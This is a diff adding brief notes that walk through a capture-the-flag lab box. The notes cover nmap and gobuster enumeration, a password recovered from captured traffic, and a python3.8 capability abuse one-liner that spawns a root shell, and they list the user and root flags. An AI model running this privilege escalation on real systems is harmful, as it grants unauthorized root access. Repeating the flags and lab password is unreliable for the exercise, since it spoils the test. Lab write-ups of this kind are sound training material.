@@ -1,0 +1,25 @@
+Nmap 10.10.10.245 
+port open 21 22 80
+
+gobuster dir -u http://10.10.10.245:80 -w /usr/share/wordlists/dirb/big.txt
+displays:
+/data
+/ip
+/netstat
+
+http://10.10.10.245/data/0
+large sets of trafic 
+
+o.pcap
+user nathan
+pass Buck3tH4TF0RM3!
+
+user flag: ce9588cc3f31908e425f8d00fec5a6e1
+
+getcap -r / 2>/dev/null
+shows /usr/bin/python3.8
+
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+utilizes python root privilage to trick into root access temporarly
+
+root flag: 6f0fb756605133847d52b9cb6383d0c7
